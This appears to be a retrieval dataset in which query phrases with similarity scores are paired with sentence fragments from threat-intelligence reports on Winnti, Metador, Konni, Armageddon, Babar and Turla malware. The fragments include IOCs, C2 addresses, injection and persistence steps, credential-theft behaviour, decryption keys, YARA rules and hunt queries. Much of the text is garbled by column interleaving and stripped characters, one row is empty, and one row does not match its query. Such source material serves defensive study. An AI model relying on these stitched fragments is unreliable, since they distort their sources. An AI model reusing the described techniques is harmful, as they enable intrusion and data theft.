RAR and SFX-RAR files|0.828785026951616|"['cert.gov.ua /article/39086  UAC-0010 (Armageddon)    (CERT-UA#4334)   2022     CERT-UA  RAR-  ""Assistance.rar"", ""Necessary_military_assistance.rar"".', '-  ""List of necessary things for the provision of military humanitarian assistance to Ukraine.lnk"", ""Providing military humanitarian assistance to Ukraine.lnk"".', "", ',      RAR-."", ',  ,    ,    UAC-0010 (Armageddon)   .', ': 6ac4153b9ca93b8eefd83e304d2e5f5b b73314087130fe98896add3430787744de7310d3342b219bd668cdce79368f91 Providing military humanitarian assistance to Ukraine.eml c0d3a0ab9b47ab9bc81cf5d831053431 596acbbfd7bc54dcc06123b7adfb7337f8ceab736004ce930d8286c8914b8e25 Assistance.rar 6c4e8c4880e388a49681cc169ccd4032 fa7bbc46a7b062a5828380b7c70a67cb47ba10c2ef127fd2348647313f65aa11 Providing military humanitarian assistance to Ukraine.lnk a4fad68e152a0f63cc525ae770e31a66 7052cef3936c29707da0dd0d4696863b63971eefa1b0e7db611df2ce26b73f50 Necessary_military_assistance.rar 7208e37192ad6f1d970a94d29ff02073 8f429996f5be9d59d86ba4346de535a25b9a2c3e89cf2e29dbc053d13ae99269 List of necessary things for the provision of military humanitarian assistance to Ukraine.lnk 7b20e3ac2a4ebf507f6c8358245d5db5 ae3fabbbb2e2297e31435b7a57c486f0eaf0f01738da8d0ab68214dc92373666 Assistance.rar 1/3ab8bb3c1ff0c19358b5cd9867dbf2206 cf7570cbbca779c755729484792208900a89564669785cb26e88442278ac52b2 Providing military humanitarian assistance to Ukraine.lnk 284aab4eada2fd522740315ee90efeed 0b63f6e7621421de9968d46de243ef769a343b61597816615222387c45df80ae Necessary_military_assistance.rar fb69fdb35859be1141a85a2af804340b 303abc6d8ab41cb00e3e7a2165ecc1e7fb4377ba46a9f4213a05f764567182e5 List of necessary things for the provision of military humanitarian assistance to Ukraine.lnk e1fe781714ecb763ccd1568f7fa11443 a0a39c06f56d63b9d37f7e72c24ec0768fe0aff497870ef879d7ae813d84bf1e Necessary_military_assistance.rar 872ef25c5c544b277b6185d75f33f9fb 09472d6bfb1c142a3b02f73175254a5e961f91e792dc9b347b099944bcfeab6f List of necessary things for the provision of military humanitarian assistance to Ukraine.lnk : Info@military-ukraine[.', ']site (envelope-from) 194[.', ']58.104.86 (Received from) hxxps://military-ukraine[.', ']site/Necessary_military_assistance.rar hxxp://military-ukraine[.']"
RAR and SFX-RAR files|0.828785026951616|"['2.', '(Attack Scenario) 2.1.', '(Attack Flowchart)   , CHM  JSE  C2    .', '[ 2-1]  2JSE Genians Security Center 3Threat Intelligence Report 2.2.', '- (Initial Access-Phishing) 2023 8        .', '.', ',    .', '(C2)    .', ',   (Top-level domain, TLD) "".cam""  .', 'donotreply@sgibn.cam https://honess[.', ']fun/0e650c610b7e1075477745755b  /download [ 2-1]    Genians Security Center 4Threat Intelligence Report [ 2-2]   Genians Security Center 5Threat Intelligence Report 2.3.']"
plus the folder|0.7869982719706573|['CobInt/COOLPANTS Phish & Infrastructure Analysis After inspecting the domain, rietumu[.', ']me, ASERT uncovered the email address solisariana[@]protonmail[.]com.', 'Pivoting on the email leads to five additional domains each with a creation date of: 2018-08-01.', '1.', 'compass[.', ']plus 2.', 'eucentalbank[.', ']com 3.', 'europecentalbank[.', ']com 4.', 'inter-kassa[.']
malicious archive,|0.8324825620300786|['Services display sensitive content.', 'for your needs.', 'such as Archive.org and Archive.Today aim to preserve all websites, which can Add the following to a robots.txt I am NAME owner of DOMAIN.', 'be an unwelcome feature for those who file on your site.', 'Im officially requesting the immediate removal of my site wish to erase their past.', 'Fortunately we (Create a new file if one is not from all archive.org products.', 'still have some privacy powers which already present.)', 'The User-agent: archive.org_ can be executed to remove undesired bot Disallow: / code present content associated with the domains User-agent: archive.org_bot in our robots.txt file is not which we own.', 'being honored.', 'It can be seen Disallow: / at: Archive.org Removal Create a file called verify.txt at the https://DOMAIN/robots.txt If your website(s) appear on Archive.', 'root of your site.']
the folder C:\Users\Public|0.754033710014308|"[':\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\*"", ""?', ':\\\\\\\\Users\\\\\\\\Public\\\\\\\\*"", ""?', ':\\\\\\\\ProgramData\\\\\\\\Microsoft\\\\\\\\*"") and (process.parent.args : ""Schedule"" or process.parent.name : ""services.exe"") # Hunt for the SiestaGraph compiled file name and running as a scheduled task: process where event.type == ""start"" and 9/11process.pe.original_file_name : ""windowss.exe"" and not process.name : ""windowss.exe"" and process.parent.args : ""Schedule"" # Hunt for unsigned executable using Microsoft Graph API: network where event.action == ""lookup_result"" and dns.question.name : ""graph.microsoft.com"" and process.code_signature.exists == false Read more YARA Elastic Security has created YARA rules to identify this activity.', 'Below are YARA rules to identify the SiestaGraph malware implant and the DoorMe IIS backdoor.', 'rule Windows_Trojan_DoorMe { meta: author = ""Elastic Security"" creation_date = ""2022-12-09"" last_modified = ""2022-12-15"" os = ""Windows"" arch = ""x86"" category_type = ""Trojan"" family = ""DoorMe"" threat_name = ""Windows.Trojan.DoorMe"" reference_sample = ""96b226e1dcfb8ea2155c2fa508125472c8c767569d009a881ab4c39453e4fe7f"" strings: $seq_aes_crypto = { 8B 6C 24 ?', '?', 'C1 E5 ?', '?', '8B 5C 24 ?', '?', '8D 34 9D ?']"
decryption|0.8598297776050206|"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the processing of the different backdoor commands based on the command number.', 'Fig 8: Older Mafalda variant: Processing of backdoor commands THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13Fig 9: Newer Mafalda variant: Processing of backdoor commands THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 https://attack.mitre.org/software/S0073//The full unobfuscated list of commands, along with the developers descriptions, are available in the Mafalda section of the Technical Appendix.', 'The following functionality is only available in the newer Mafalda variant: Network and system configuration reconnaissance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The following is a summary of some of the newer Mafalda commands: Command 60 Reads the content of the file %USERPROFILE%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with loot\\\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cookies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\\\Users\\\\test for the user test.', 'Command 61 Decrypts attacker-provided data using the DPAPI (Data Protection Application Programming Interface) key of the platform where Mafalda runs.']"
decryption|0.7786906640410152|"['{ 3. meta: 4.', '5. description = ""Detects obfuscation patterns used in HALFRIG.', 'This rule wasn\'t tested against large dataset, it should be used for threat hunting and not on services like VTI.""', '6.', '7. strings: 8.', '// Decryption constants and decryption operation 9.', '$ = {48 BB 0B 91 09 19 4D FD 9B F3 } 10.', '11.', '$ = {4D 8D 40 01 48 8B CA 48 8B C2 48 C1 E9 38 48 83 C9 01 48 C1 E0 08 48 8B D1 48 33 D0} 12.', '13.', '$ = {C7 05 [3] 00 F7 91 4D 01 } 14.']"
writes the file svchost.bat, which transfers control to winness.exe, to the startup folder|0.835678450899326|['The PDF file is saved with a name resembling _797918755_true.pdf in a temporary folder.', 'It then opens for the user (the second window in the screenshot on Figure 26, next to HTML Help).', '15/41Figure 31. resume.exe: actions on first launch The payload runs in a new process %windir%\\\\System32\\\\spoolsv.exe, into which the main shellcode is injected: Cobalt Strike Beacon with C2 address 149.28.84[.]98.', 'Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe.', 'For persistence, resume.exe (under the name winness.exe) is copied to the folder %appdata%\\\\Microsoft\\\\AddIns\\\\ and the main shellcode is re-encrypted and saved in the same location, with the name winness.config.', 'To ensure autostart, auxiliary shellcode writes the file svchost.bat, which transfers control to winness.exe, to the startup folder.', 'For avoiding detection at this stage, the auxiliary shellcode is injected in a similar way into spoolsv.exe, independently loads the necessary functions, and writes to file in a separate thread.', 'When winness.exe runs after a restart, the main shellcode is decrypted from winness.config and injected into spoolsv.exe in exactly the same way.', '3.2 HFS with a surprise Figure 32.', 'HFS server on Winnti infrastructure On June 23, 2020, while investigating Winnti network infrastructure, we detected an active HttpFileServer on one of the active C2 servers.', 'Four images were there for all to see: an email icon, screenshot from a game with Russian text, screenshot of the site of a game development company, and a screenshot of information about vulnerability CVE-2020-0796 from the Microsoft website.']
writes the file svchost.bat, which transfers control to winness.exe, to the startup folder|0.835678450899326|['If the user opens it directly, a message warns that the document is password-protected.Figure 30.', 'MyResume.pdf, as viewed in Adobe Acrobat ReaderCompared to the PL shellcode, the data structure is more complex and contains the following:ROR-13 hash of data starting from byte 0x24 (0x20, 4 bytes)Nonce for algorithm ChaCha20 (0x24, 12 bytes)ChaCha20-encrypted text (0x30):Name of PDF file (+0x0)Size of PDF file (+0x20)Size of auxiliary shellcode (+0x24)Size of main shellcode (+0x28)Constant 0xE839E900 (+0x2C)PDF fileAuxiliary shellcodeMain shellcodeOn first launch of resume.exe, the encrypted portion of the data is decrypted (the key is hard-coded in the executable) and three sections are extracted (PDF, auxiliary shellcode, and main shellcode).', 'The PDF file is saved with a name resembling _797918755_true.pdf in a temporary folder.', 'It then opens for the user (the second window in the screenshot on Figure 26, next to HTML Help).Figure 31. resume.exe: actions on first launchThe payload runs in a new process %windir%\\\\System32\\\\spoolsv.exe, into which the main shellcode is injected: Cobalt Strike Beacon with C2 address 149.28.84[.', ']98.Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe.For persistence, resume.exe (under the name winness.exe) is copied to the folder %appdata%\\\\Microsoft\\\\AddIns\\\\ and the main shellcode is re-encrypted and saved in the same location, with the name winness.config.', 'To ensure autostart, auxiliary shellcode writes the file svchost.bat, which transfers control to winness.exe, to the startup folder.', 'For avoiding detection at this stage, the auxiliary shellcode is injected in a similar way into spoolsv.exe, independently loads the necessary functions, and writes to file in a separate thread.When winness.exe runs after a restart, the main shellcode is decrypted from winness.config and injected into spoolsv.exe in exactly the same way.3.2 HFS with a surpriseFigure 32.', 'HFS server on Winnti infrastructureOn June 23, 2020, while investigating Winnti network infrastructure, we detected an activeHttpFileServeron one of the active C2 servers.', 'Four images were there for all to see: an email icon, screenshot from a game with Russian text, screenshot of the site of a game development company, and a screenshot of information about vulnerabilityCVE-2020-0796from the Microsoft website.Figure 33.', '13524222881554126454-128.pngFigure 34.', 'EaVpPBNXgAE8s3r.jpgFigure 35. website_battlestategames.pngFigure 36. windows_update.pngThe screenshots related to Battlestate Games, the St. Petersburg-based developer ofEscape from Tarkov.Almost two months later, on August 20, 2020, the file CV.pdf____________________________________________________________.exe (e886caba3fea000a7de8948c4de0f9b5857f0baef6cf905a2c53641dbbc0277c) was uploaded to VirusTotal.']
Shellcode version and whether it is 32-bit or 64-bit|0.7518091830947601|"['Going further, we can find domains from a Kaspersky report written in 2013.', 'Figure 9.', 'Fragment of network infrastructure All this leads us to conclude that these LNK file attacks were performed by Winnti (APT41), which ""borrowed"" this shortcut technique from Higaisa.', '1.2 Crosswalk Crosswalk is a modular backdoor implemented in shellcode.', 'The main component connects to a C2 server, collects and sends system information, and contains functionality for installing and running up to 20 additional modules received from the server as shellcode.', 'The information collected by the module includes: OS uptime Network adapter IP addresses MAC address of one of the adapters Operating system version and whether it is 32-bit or 64-bit Username Computer name 5/41Name of running module PID Shellcode version and whether it is 32-bit or 64-bit (The shellcode supports both 32 and 64 bits.)', 'It has two-part version numbers; we found ones including 1.0, 1.10, 1.21, 1.22, 1.25, and 2.0.', 'For more detailed analysis of one version of Crosswalk, see the VMware CarbonBlack investigation.', 'Based on version 1.25 (8e6945ae06dd849b9db0c2983bca82de1dddbf79afb371aa88da71c19c44c996), which was used in the attacks with LNK files, here we will describe the networking aspects of the malware in more detail.', 'Crosswalk has broad capabilities for connecting to C2 servers.', 'The network configuration for this particular sample is at the end of the shellcode and is XOR encrypted with a 16-byte key.']"
Computer name|0.9941158051361211|[]
Computer name|0.765093203018953|"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B eginning last year, we identified cyber When an unsuspecting user visits any of the actors integrating free, publicly available over 100 compromised websites, a small piece The following are tools with custom scripts to monitor the of inserted codeembedded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tools embedded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they collect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to collect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on different types of web browsers can help cyber profiling script.', 'The detect Office threat actors better identify their victims and module from the tailor future infection attempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tool, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Office opportunity, but specifically selected as part of about the vulnerabilities in version on a computer a tactic called a strategic web compromise.3 The users computers.', 'by testing the browsers attackers then modify the underlying HTML response to various ActiveX objects.']"
Computer name|0.765093203018953|['versions of the RAT including the ability to start a 204 52 Unknown.', 'command shell, control processes and services, 256 32 Nullterminated computername(if upload/download files, terminate TCP connections, successfullyobtainedfromthesystem).', 'createuseraccounts, retrievesystem information, log 288 12 Processname.', 'useractivity(viaakeylogger), modifytimestamps on 300 52 0x00 bytes inallobserved files, conduct process injection, conduct denial of communications.', 'service attacks and shutdown or restart the 352 36 SYSTEM_INFO16structure(format showninAnnexB).', 'computer.', 'Commands supported by the XShell softwarearelisted inAnnexC.', '(XTiger) 388 72 0x00 bytes inallobserved samples.', '460 12 Unknown.', '472 4 Localeidentifier17.', '18Theprocess svchost.exe isagenerichostprocessforservices 476 4 Tick count(repeated).']
Computer name|0.7734214465342704|['Out of the created files, all files are obfuscated except for the legitimate doc file.Lomd02.png (Malicious jse script)Operator.jse (Malicious jse script)WindowsHotfixUpdate.jse (Malicious jse script)20231126_9680259278.doc (Legitimate doc file)WindowsHotfixUpdate.ps1 (Malicious PowerShell script)A legitimate document file, 20231126_9680259278.doc, is included among the created files.', 'The threat actor has probably included this to deceive the user into thinking that they opened a legitimate file.Operator.jse creates a Task Scheduler entry that executes WindowsHotfixUpdate.jse, which in turn executes the file WindowsHotfixUpdate.ps1.', 'The file WindowsHotfixUpdate.ps1 receives commands from the C2, and it is presumed that these commands are obfuscated, because the jse file with the file name Lomd02.png was observed deobfuscating such commands and loading them in xml format.While additional commands could not be examined due to the C2 being unavailable for access at the moment, it seems that various additional attacks would be possible depending on the commands sent from the C2.Task Scheduler name: WindowsHotfixUpdate[B409302303-02940492024]Trigger: Repeat every minute indefinitelyAction: Execute C:\\\\ProgramData\\\\WindowsHotfixUpdate.jseBecause the bait file is also run, ordinary users cannot recognize that their systems are infected by malware.', 'Since such malware are aimed at specific targets, users should refrain from running attachments in emails sent from unknown sources.', '[File Detection]Backdoor/JS.Konni (2023.12.06.03)Backdoor/Win.Konni (2023.12.06.03)Backdoor/PowerShell.Konni (2023.12.06.03)MD5682b5a3c93e107511fdd2cdb8e50389a78ea811850e01544ca961f181030b584a93474c3978609c8480b34299bf482b7b58eb8a3797d3a52aba30d91d207b688d06d1c2ec1490710133dea445f33bd19URLhttp[:]//gjdow[.]atwebpages[.]com/dn[.', ']php?name=[Computer']
Collects the configuration of active connector instances other than the RPCConnector and RPCBindConnector classes.|0.9682343018741555|['Figure 44.', 'Loading the Funny.Eval class from the JSCore assembly Code execution is accomplished with classes from the Microsoft.JScript namespace.', 'Figure 45.', 'Code fragments from the Funny.Eval class connect Takes an XML string with connector configuration and creates the corresponding object.', 'update Packs a response containing the IDs of relays connected to the current copy, together with their system information.', 'query Collects the configuration of active connector instances other than the RPCConnector and RPCBindConnector classes.', 'remove Removes the specified connector.', '24/41Command Description createStream Creates a message queue with the indicated name.', 'The queue connects with the sender of the createStream command.', 'closeStream Deletes the named message queue.', 'sendStream Adds a message (byte array) to the queue with the specified name.']
messages are exchanged in the original TCP connection (without TLS encryption).|0.9336403854820547|['After receipt of a response with code 200, subsequent messages from the client to the server are sent using separate POST requests.', 'Figure 11.', 'Second HTTP connection with C2 3.', 'Duplication of socket with TLS connection The client establishes a TCP connection and sends an HTTPS request like the following one: GET /msdn.cpp HTTP/1.1 Connection: Keep-Alive User-Agent: WinHTTP/1.1 Content-Length: 4294967295 Host: 149.28.152[.', ']196 The HTTPS connection is not used again.', 'Subsequent messages are exchanged in the original TCP connection (without TLS encryption).', 'Subsequent communication between the client and server occurs via protocol 1, except for when, at the beginning of the session, the client sends two packets with the FakeTLS header, which starts with the sequence 17 03 01.', 'The first packet always has length 0.', 'The second has length 0x3A, 0x3C, 0x3E, or 0x40 and contains random bytes.', 'We were unable to determine the purpose of these packets.', 'Figure 12.']
KCP protocol|0.7736326875498903|['I59RFRLY9J.tmp %WinDir%\\\\System32\\\\9cda11af69ab0a2b6a9167f7131e7b93.keySecurity solution verdictsTrojan.Win64.Manuscrypt.doURL addresseshxxp://email.yg9[.', ']me hxxp://google.vrthcobj[.', ']com hxxp://d.diragame[.', ']com toa.mygametoa[.', ']com tob.mygametob[.', ']com']
uses KCP on top of a TCP connection|0.7507758009138836|['The second has length 0x3A, 0x3C, 0x3E, or 0x40 and contains random bytes.', 'We were unable to determine the purpose of these packets.', 'Figure 12.', 'Additional packets with FakeTLS header 7/414.', 'KCP protocol This protocol can be implemented on top of any other protocol (including UDP) to ensure quick and reliable data transfer.', 'The Crosswalk client uses KCP on top of a TCP connection: KCP protocol data is added to application-level messages that are then sent as TCP segments.', 'Figure 13.', 'Crosswalk message with KCP headers (highlighted in yellow) Note that in the Crosswalk samples we detected, none of the samples used the KCP protocol in practice.', 'But the code contains a full- fledged implementation of this protocol, which could be used in other attacks: the developers would simply need to set this connection type in the configuration.', 'The diversity of protocols and techniques would seem to protect the backdoor from network traffic inspection.', '2.']
Network-level protocol|0.9283013043031253|['This type of DDoS is famous for its two stages of infecting hosts and creating botnet of zombies who pretend to be a well defended endpoint and the attack phase that has been seen to take from minutes to over multiple days.', 'The vector varies from network type attacks to application layer attacks235.', 'Encrypted Attacks.', 'The rise of using encrypted services and traffic (SSL) on the web has attracted different levels of DDoS attacks.', 'This includes attacks on the application level (flood attacks, bruteforce etc.', '), network level and the protocol level (i.e.', 'SSL renegotiation or downgrade) making it harder for defenders and toolsets to recognise malicious traffic from legitimate236.', '3.5.5 Specific attack vectors According to Nexusgaurd Q2 2018 report, most of the attacks were focused on hit-run tactics and specifically during peak times to strike their targets with UDP, TCP (SYN) and ICMP floods being the top 3 vectors.', 'The duration of these malicious attempts were mostly recorded as lasting less than 90 minutes and the longest to more than 6 days.', '234https://www.ipexpoeurope.com/content/download/13783/181390/file/NETSCOUT_ThreatReport_FINAL_080618 b.pdf, accessed November 2018.', '235 https://www.hindawi.com/journals/scn/2018/5353060/, accessed November 2018.']
AES-128 is the encryption algorithm used.|0.7611552611004168|"[""MISCREANT'S DROPPER The dropper operates straight forward; it fetches the encrypted DLL from its own binary from outside its resource section, decrypts it and hides it in the file system."", 'Then it goes on to load the DLL using Windows regsvr32.exe.', 'To achieve this it spawns a dedicated process with the command line \'""regsvr32.exe"" /s /n /i ""%APPDATA%\\\\%DLLNAME%""\'.', 'The DLL name is random but legitimately looking and hardcoded for a specific dropper.', ""It is also stored as encrypted string in the binary, and has been seen to decrypt to either 'perf585.dll' or 'dump21cb.dll' depending on the dropper."", 'The encryption algorithm used is AES (Advanced Encryption Standard) with 128-bit keys.', ""The keys used for decryption are '20 33 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C' for the implant filename and 'A0 0E 3E B3 3A 1C D3 AA A0 BE 3F B3 F9 0A 96 15' for decrypting the binary."", ""AES is the encryption algorithm of choice throughout the dropper and its implant's operations."", 'Interestingly, the Babar dropper as well as the implant show a similar method of API name obfuscation as the Bunny malware and samples from the NBOT family.', 'Dedicated APIs are loaded through a resolution function, which searches for library exports by comparing hashes of the export names with a given hash.', 'For the Babar project though the attackers used an adapted version of SHA-1, as opposed to the simple XOR/ROL hash algorithm which was used in the Bunny project.']"
AES-128 is the encryption algorithm used.|1.0000000000000002|['For the client these always equal 17 03 01; for the server, they have random values.', 'Data length, not including header (2 bytes) Message contents: Command ID (4 bytes, little-endian) Command data size (4 bytes, little-endian) Client ID (36 bytes), generated based on the UUID when the backdoor starts operation Command data The first two clientserver and serverclient messages have command IDs 0x65 and 0x64, respectively.', 'They contain the data that will then be used to generate the client and server session keys.', 'The key generation algorithm is detailed in a Zscaler report.', 'For all subsequent messages, the content (not including the FakeTLS header) is transferred in the corresponding encrypted session key.', 'AES-128 is the encryption algorithm used.', 'The transport-level protocol depends on the connection type indicated in the configuration.', 'Four protocols are supported: 1.', 'Standard TCP connection Application-level messages are sent unchanged as TCP segments.', '6/412.', 'Equivalent to HTTP Long Polling The client creates two TCP connections.']
encrypted with AES-256-CBC;|0.92741333077336|['Basically, its a payload loader.', 'The whole code is obfuscated with different Windows API calls and loops.', 'It wasnt designed to confuse a reverse engineer or to make reverse engineering harder, but to bypass some simple AV emulation engines.', 'The first exported function for every COM object is DllGetClassObject.', 'DllGetClassObject The loader creates a thread that decrypts the payload, restores its PE and MZ headers, and then loads it into memory and launches it.', 'The payload is encrypted with AES 256 CBC.', 'The decryption key is hardcoded along with other encrypted strings.', 'It doesnt contain MZ and PE tags that allow it to bypass simple AV engines.', 'After initializing the payload, the loader calls its function with ordinal 1. nav_downarrow.png The payload, with backdoor functionality, is a DLL file.', 'The malware functionality is in the first exported entry only.', 'nav_downarrow.png Ordinal 1 (Trojan-backdoor main function) The first thing that it does is decrypt the other encrypted binary (containing configuration data) from the SFX content: The configuration itself is divided into blocks, and every block has its own index.']
encrypted with AES-256-CBC;|0.92741333077336|['After that it launches the e.ps1 script to calculate the SystemID that will be used in requests to the C&C.To send a request, it uses c.dll (which is cURL and has an exported function called DllGetClassObject).Request 1Command line arguments:Where:ParameterDescription%pp%System-wide proxy%output%SystemID%p3%AcceptanceIDThis request downloads the x.dat file, and the f1.ps1 script decrypts it into u.xml.', 'After that it launches the next request.Request 2Command line arguments:It downloads the b.dat file, and the f2.ps1 script decrypts it into i.bat (using the same decryption algorithm).Task installationAfter that, it launches the following command line to install the persistence task:The i.bat file uses the previously decrypted u.xml file as the task description.Trojan-backdoor installerThe archive unpacks its files into the following folder (in the case of DVD making software):The archive itself contains:NameDescriptionBabyBoyStyleBackground.wmvConfiguration dataDvDupdate.dllTrojan-backdoor loadernav_downarrow.pngTrojan-backdoorpsinstrc.ps1Loader installation scriptIn the case of theaudio drivers softwaremimic, it differs only in its installation method compared toDVD making software: the ps1 script uses two known CLSIDs to replace their COM DLL paths with malicious ones.psinstrc.ps1This is the installer script that registers DvDupdate.dll as theDVDMaker Helpservice, and sets its entry point as theDllGetClassObjectname.', 'It requires admin privileges to be executed correctly.The script contains configurable parameters, so its easy to change any of the required parameters for different systems.There are two ways the loader can be installed:System service, with theDllGetClassObjectexported function as the ServiceMain functionCOM object, by replacing an existing CLSID registry path with its ownDvDupdate.dllThis is a service DLL, but with all the same exports you would expect from a COM object.', 'Basically, its a payload loader.The whole code is obfuscated with different Windows API calls and loops.', 'It wasnt designed to confuse a reverse engineer or to make reverse engineering harder, but to bypass some simple AV emulation engines.The first exported function for every COM object isDllGetClassObject.DllGetClassObjectThe loader creates a thread that decrypts the payload, restores its PE and MZ headers, and then loads it into memory and launches it.', 'The payload is encrypted with AES 256 CBC.', 'The decryption key is hardcoded along with other encrypted strings.', 'It doesnt contain MZ and PE tags that allow it to bypass simple AV engines.', 'After initializing the payload, the loader calls its function with ordinal 1.nav_downarrow.pngThe payload, with backdoor functionality, is a DLL file.', 'The malware functionality is in the first exported entry only.nav_downarrow.png Ordinal 1 (Trojan-backdoor main function)The first thing that it does is decrypt the other encrypted binary (containing configuration data) from the SFX content:The configuration itself is divided into blocks, and every block has its own index.', 'The payload uses these indices to get a specific item.']
is encrypted in the standard way|0.7601711479878657|"['Standard encryption in FunnySwitch 21/412.', 'HTTP with long polling There are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".', 'To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.', 'The cookie name is eight random characters.', 'The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").', 'The string is encrypted in the standard way with the key ""http"".', 'The client then constantly sends GET requests with pull operations.', 'In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.', 'Clientserver messages are periodically sent as an array as well, for which a POST request with push operation is used.', 'Figure 42.', 'FunnySwitch connect and pull requests The special class MsgPack class, which implements a custom serialization protocol, unpacks the array and other primitive types.']"
inject shellcode into the process|0.7909302396955022|['Their buffers are expected to be allocated at specific locations.', '7.', 'Create special properties to cause inconsistency between the number of properties assigned to the same resource in kernel mode/user mode for resources created at stage 4.', '8.', 'Use OOB write vulnerability to write shellcode, create an object and get code execution.', '9.', 'Inject additional shellcode into another system process.', 'Kaspersky products detect this exploit with the verdicts: HEUR:Exploit.Win32.Generic HEUR:Trojan.Win32.Generic PDM:Exploit.Win32.Generic Zero-day vulnerability in Desktop Window Manager (CVE-2021-28310) used in the wild Your email address will not be published.', 'Required fields are marked * https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/ 9/9']
SeDebugPrivilege|0.783325337968191|['put the company in contact with Zeppelin victims so that they could help decrypt their files.', 'The attackers Use application allow listing where applicable.', 'said they were motivated to crack Zeppelin after the Locking down PowerShell can increase security, for ransomware gang started attacking nonprofit and example with the constrained language mode.', 'charity organizations.', 'Despite this occurrence, Zeppelin Make credential dumping more difficult, for example activity continued in 2023, though not at the same levels by enabling Credential Guard in Windows 10 or as seen in previous years.', 'disabling SeDebugPrivilege.', 'MFA can help limit the usefulness of compromised Conclusion credentials.', 'Ransomware will continue to be a major threat for Create a plan to consider notification of outside organizations in 2024 and beyond.', 'Incentivized by parties.', 'In order to ensure correct notification of big payouts, ransomware attackers have proven to required organizations, such as the FBI or other law be persistent and adaptive, capable of responding to enforcement authorities/agencies, be sure to have a disruption by reorganizing themselves and consistently verifiable plan in place.', 'developing new tactics.']
Microsoft CryptoAPI|0.8348105670173975|"[""The attacker uses english language for the logging, although he is lacking attention to detail when it comes to correct usage of the language, as the following examples demonstrate: win32 detect... (should be simple past) x64 detect... (should be simple past) CretaFileA(%s): (should be CreateFileA) Can`t open SERVICES key (that shouldn't be a backtick) Language deficits are also demonstrated in other files of this collection."", 'We show them in a separate chapter.', 'A list of dropped files is given in the next chapter.', 'Dropped files Sample B - usbdev.sys (Resource: 101) Hashes Type of Hash Hash MD5 db93128bff2912a75b39ee117796cdc6 SHA1 418645c09002845a8554095b355f47907f762797 SHA-256 57b8c2f5cfeaca97da58cfcdaf10c88dbc2c987c436ddc1ad7b7ed31879cb665 3072:3B9f3bhj+FqCjAsWnQNCb/XzeQdRSFqfCeEmI/2XxjptNdjxjkMAE4E:3B9tQHWLrFfCZmI ssdeep /MttB+E4 VirusTotal results for sample B AV product Result Bkav W32.Cloda11.Trojan.222a MicroWorld-eScan Backdoor.Generic.252173 nProtect Trojan/W32.Agent2.252928 McAfee Artemis!DB93128BFF29 K7GW Trojan ( 0001140e1 ) K7AntiVirus Riskware ( 10a2c0f80 ) Agnitum Trojan.Agent2!HMPS2EOZWFE F-Prot W32/MalwareS.IHA Symantec Backdoor.Pfinet Norman Suspicious_Gen3.DGZV TrendMicro-HouseCallTROJ_GEN.R27E1AH Avast Win32:Malware-gen Kaspersky Trojan.Win32.Agent2.flce BitDefender Backdoor.Generic.252173 Ad-Aware Backdoor.Generic.252173 Sophos Mal/Generic-S F-Secure Backdoor.Generic.252173 DrWeb Trojan.Siggen1.51234 VIPRE Trojan.Win32.Generic!BT AntiVir TR/Rootkit.Gen TrendMicro TROJ_GEN.R27E1AH 6 of 34 12/31/2014 09:19 AMCIRCL TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/ AV product Result McAfee-GW-Edition Artemis!DB93128BFF29 Emsisoft Backdoor.Generic.252173 (B) Jiangmin Trojan/Agent.djjf Antiy-AVL Trojan/Win32.Agent2 Kingsoft Win32.Troj.Agent2.', '(kcloud) Microsoft Backdoor:WinNT/Pfinet.B GData Backdoor.Generic.252173 Commtouch W32/Risk.DWJW-7987 VBA32 Trojan.Agent2 Panda Rootkit/Agent.IOO ESET-NOD32 a variant of Win32/Turla.AC Ikarus Trojan.Win32.Agent Fortinet W32/Agent2.LDY!tr AVG Agent2.AHWF Baidu-International Trojan.Win32.Agent.AFZ Scanned: 2014-03-23 21:28:41 - 51 scans - 36 detections (70.0%) File characteristics Meta data Size: 252928 bytes Type: PE32 executable (DLL) (native) Intel 80386, for MS Windows Date: 0x4AC48FC8 [Thu Oct 1 11:17:28 2009 UTC] EP: 0x22d80 .text 0/5 CRC: Claimed: 0x3e7fe, Actual: 0x3e7fe Sections Name VirtAddr VirtSize RawSize Entropy -------------------------------------------------------------------------------- .text 0x1000 0x28084 0x28200 6.325480 .basein 0x2a000 0x135 0x200 3.791369 .data 0x2b000 0x20e34 0x12600 1.335577 